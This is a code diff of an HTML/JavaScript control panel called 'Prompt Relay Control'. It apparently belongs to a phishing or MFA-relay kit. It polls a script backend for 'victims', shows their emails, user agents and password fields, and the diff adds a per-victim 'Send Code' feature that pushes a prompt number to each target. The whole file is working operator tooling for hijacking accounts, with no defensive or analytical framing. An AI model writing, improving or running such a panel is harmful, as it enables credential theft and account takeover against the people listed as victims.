@@ -13,14 +13,8 @@
       padding: 20px;
       line-height: 1.5;
     }
-    .container {
-      max-width: 1000px;
-      margin: 0 auto;
-    }
-    h1 {
-      color: #58a6ff;
-      margin-bottom: 0.4em;
-    }
+    .container { max-width: 1100px; margin: 0 auto; }
+    h1 { color: #58a6ff; margin-bottom: 0.4em; }
     #status {
       font-size: 1.1rem;
       padding: 12px 16px;
@@ -40,7 +34,7 @@
       background: #161b22;
       border: 1px solid #30363d;
       border-radius: 6px;
-      font-family: 'Consolas', 'Courier New', monospace;
+      font-family: 'Consolas', monospace;
       white-space: pre-wrap;
       word-break: break-all;
       max-height: 400px;
@@ -56,36 +50,44 @@
       border: 1px solid #30363d;
       border-radius: 6px;
     }
-    #victims-table th,
-    #victims-table td {
+    #victims-table th, #victims-table td {
       padding: 12px 14px;
       text-align: left;
       border-bottom: 1px solid #30363d;
     }
-    #victims-table th {
-      background: #0d1117;
-      color: #8b949e;
-    }
-    #victims-table tr:hover {
-      background: #1f2937;
-    }
+    #victims-table th { background: #0d1117; color: #8b949e; }
+    #victims-table tr:hover { background: #1f2937; }
 
-    #last-update {
-      color: #8b949e;
+    .code-input {
+      background: #0d1117;
+      color: #c9d1d9;
+      border: 1px solid #444c56;
+      border-radius: 4px;
+      padding: 6px 8px;
+      width: 110px;
+      margin-right: 8px;
+    }
+    .send-btn {
+      background: #238636;
+      color: white;
+      border: none;
+      padding: 6px 12px;
+      border-radius: 4px;
+      cursor: pointer;
       font-size: 0.9rem;
     }
+    .send-btn:hover { background: #2ea043; }
+
+    #last-update { color: #8b949e; font-size: 0.9rem; }
   </style>
 </head>
 <body>
-
   <div class="container">
     <h1>Prompt Relay Control</h1>
-
     <div id="status" class="fetching">Fetching victims...</div>
 
     <div id="raw-response">
-      <strong>Raw response from script (for debugging):</strong><br>
-      (nothing received yet)
+      <strong>Raw response from script:</strong><br>(nothing received yet)
     </div>
 
     <table id="victims-table" style="display: none;">
@@ -96,6 +98,7 @@
           <th>Status</th>
           <th>User Agent</th>
           <th>Password</th>
+          <th>Send Code</th>
         </tr>
       </thead>
       <tbody id="victims-body"></tbody>
@@ -120,65 +123,34 @@
       statusEl.className = "fetching";
 
       try {
-        const url = `${SCRIPT_URL}?getVictims=true`;
-        const res = await fetch(url, {
+        const res = await fetch(`${SCRIPT_URL}?getVictims=true`, {
           cache: 'no-cache',
           headers: { 'Accept': 'application/json, text/plain, */*' }
         });
 
         const text = await res.text();
+        rawEl.innerHTML = `<strong>Raw response from script:</strong><br>${escapeHtml(text || '(empty)')}`;
 
-        // Always show raw response (this helps you see exactly what comes back)
-        rawEl.innerHTML = `<strong>Raw response from script:</strong><br>${escapeHtml(text || '(empty response)')}`;
+        if (!text.trim()) return showEmpty("Empty response");
 
-        if (!text.trim()) {
-          showEmpty("Empty response from script");
-          return;
-        }
-
-        let data;
-        try {
-          data = JSON.parse(text);
-        } catch (e) {
-          showRawAsFallback(text);
-          return;
-        }
-
-        // ────────────────────────────────────────────────
-        // ADAPTED EXTRACTION – matches your GAS direct array response
-        // ────────────────────────────────────────────────
-        let victims = [];
-
-        if (Array.isArray(data)) {
-          // Your GAS returns a direct array → this is the main match
-          victims = data;
-        } else if (data && Array.isArray(data.victims)) {
-          victims = data.victims;
-        } else if (data && typeof data === 'object') {
-          // Fallback: find any array in the object
-          victims = Object.values(data).find(Array.isArray) || [];
-        }
+        const data = JSON.parse(text);
+        const victims = Array.isArray(data) ? data : (data.victims || []);
 
         if (victims.length > 0) {
-          // Map fields to match table columns (your GAS uses "user_agent", not "userAgent")
-          const mappedVictims = victims.map(item => ({
-            timestamp: item.timestamp || '—',
-            email:     item.email     || '—',
-            status:    'victim_ready', // all rows here are ready ones
-            userAgent: item.user_agent || item.userAgent || '—',
-            password:  '—'             // not included in this endpoint
+          const mapped = victims.map(v => ({
+            timestamp: v.timestamp || '—',
+            email:     v.email     || '—',
+            status:    'victim_ready',
+            userAgent: v.user_agent || v.userAgent || '—',
+            password:  '—'
           }));
-
-          renderVictims(mappedVictims);
+          renderVictims(mapped);
         } else {
-          showEmpty("No victims ready in response");
+          showEmpty("No ready victims");
         }
-
       } catch (err) {
-        const msg = err.name === 'TypeError' ? 'Network or CORS issue' : err.message;
-        statusEl.textContent = `Error: ${msg}`;
+        statusEl.textContent = `Error: ${err.message}`;
         statusEl.className = "error";
-        rawEl.innerHTML += `<br><span style="color:#f85149;">Fetch failed: ${escapeHtml(err.message)}</span>`;
       }
     }
 
@@ -192,10 +164,13 @@
           <td>${escapeHtml(item.status)}</td>
           <td title="${escapeHtml(item.userAgent)}">${escapeHtml(item.userAgent.slice(0,70))}${item.userAgent.length > 70 ? '...' : ''}</td>
           <td>${escapeHtml(item.password)}</td>
+          <td>
+            <input type="text" class="code-input" placeholder="Enter code" data-email="${escapeHtml(item.email)}">
+            <button class="send-btn" data-email="${escapeHtml(item.email)}">Send</button>
+          </td>
         `;
         tbodyEl.appendChild(tr);
       });
-
       tableEl.style.display = 'table';
       statusEl.textContent = `Victims connected: ${items.length}`;
       statusEl.className = "success";
@@ -209,28 +184,41 @@
       lastUpdateEl.textContent = new Date().toLocaleTimeString();
     }
 
-    function showRawAsFallback(raw) {
-      statusEl.textContent = "Response received but not valid JSON";
-      statusEl.className = "error";
-      rawEl.innerHTML += `<br><br><strong>Fallback view (raw text):</strong><br>${escapeHtml(raw)}`;
-      tableEl.style.display = 'none';
-      lastUpdateEl.textContent = new Date().toLocaleTimeString();
-    }
-
     function escapeHtml(unsafe) {
-      return unsafe
-        .replace(/&/g, "&amp;")
-        .replace(/</g, "&lt;")
-        .replace(/>/g, "&gt;")
-        .replace(/"/g, "&quot;")
-        .replace(/'/g, "&#039;");
+      return unsafe.replace(/[&<>"']/g, m => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;' })[m]);
     }
 
-    // Start polling
+    // Handle Send button clicks
+    document.addEventListener('click', async e => {
+      if (!e.target.classList.contains('send-btn')) return;
+
+      const email = e.target.dataset.email;
+      const input = document.querySelector(`.code-input[data-email="${escapeHtml(email)}"]`);
+      const code = input?.value.trim();
+
+      if (!code) return alert("Enter a code first");
+
+      if (!confirm(`Send "${code}" to ${email}?`)) return;
+
+      try {
+        const params = new URLSearchParams({ action: "set_number", email, prompt_number: code });
+        const res = await fetch(`${SCRIPT_URL}?${params}`, { cache: 'no-cache' });
+
+        if (res.ok) {
+          alert(`Sent "${code}" to ${email}`);
+          input.value = '';
+        } else {
+          alert("Send failed");
+        }
+      } catch (err) {
+        alert("Error: " + err.message);
+      }
+    });
+
     fetchVictims();
     setInterval(fetchVictims, 5000);
   </script>
 </body>
 </html>
 
-
+  
